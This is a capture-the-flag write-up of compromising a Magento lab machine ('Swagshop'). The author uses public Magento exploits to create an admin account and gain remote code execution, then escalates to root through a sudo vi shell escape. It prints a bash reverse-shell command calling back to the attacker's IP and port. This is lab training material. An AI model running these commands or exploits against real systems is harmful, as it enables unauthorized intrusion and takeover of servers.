# Swagshop

### Machine Info
![](screenshots/swagshop.png)

#### Nmap
![](screenshots/nmap.png)


##### HTTP (Port 80)

![](screenshots/index.png)

`/app/Mage.php` could include version info but cannot read.


http://10.10.10.140/RELEASE_NOTES.txt

![](screenshots/release_notes.png)

Based on release notes we can assume that this is magento version 1.7.0.2.

![](screenshots/magento_copyright.png)

But I found that copyright for application is 2014 which means this could be magento version 1.9.


I am not sure but I think this could be between 1.7.0.2 and 1.9.



![](screenshots/magento_exploits.png).

Searched for public exploits and I found 2 interesting exploits `37811.py` and `37977.py` as both exploits are about `RCE(Remote Code Execution)`.


Let's check for `37977.py` first as we are not authenticated yet:
![](screenshots/magento_37977_2.png)
![](screenshots/magento_37977.png)


The exploit target for this url `/admin/Cms_Wysiwyg/directive/index`. If we have that address maybe we could exploit with this exploit:
![](screenshots/magento_test.png)

We can access to that particular address but redirected to admin login page. Let's just try this exploit as this will create admin account for us.

Modification of Exploit:
![](screenshots/exploit_modi.png)

Execute exploit:
```
❯ python magento_create_admin.py
WORKED
Check http://10.10.10.140/index.php/admin with creds hacker:hacker
```

Then try login with `hacker:hacker` and we can get admin panel:
![](screenshots/magento_admin.png)



From the admin panel, I could check the version of `magento`:
![](screenshots/magento_version.png)


Now we are authenticated so we can try the other exploit `37811.py` which requires `authenticated`.

First modify exploit:
![](screenshots/37811_config.png)

Then execute:
![](screenshots/37811_error.png)

I don't know why it makes error so let's check by using `burp`:

![](screenshots/burp_error.png)

As we can see from the `burp`, the option value `7d` is selected and it returns `No Data Found`. This could be an issue. I will change this to `1y`:

![](screenshots/37811_1y.png)

Execute:
![](screenshots/37811_1y_fail.png)

still retunrs `No Data Found`.

Change to `2y` and try again:
![](screenshots/37811_2y_chart.png)

This time we got different result and it worked:
![](screenshots/37811_success.png)


Now we can try to get reverse shell with different argument:
```
❯ python magento_rce.py http://10.10.10.140/index.php/admin/ "bash -c 'bash -i >& /dev/tcp/10.10.14.37/4444 0>&1'"
```

`nc` listener on attacking side:
![](screenshots/low_shell.png)

#### Privilege Escalation

Check for `sudo`:
![](screenshots/sudo.png)

Execute `sudo /usr/bin/vi /var/www/html/*` and from the vi editor just `:!sh` which executes a shell:

![](screenshots/root_shell.png)


And you can get `root.txt` :)
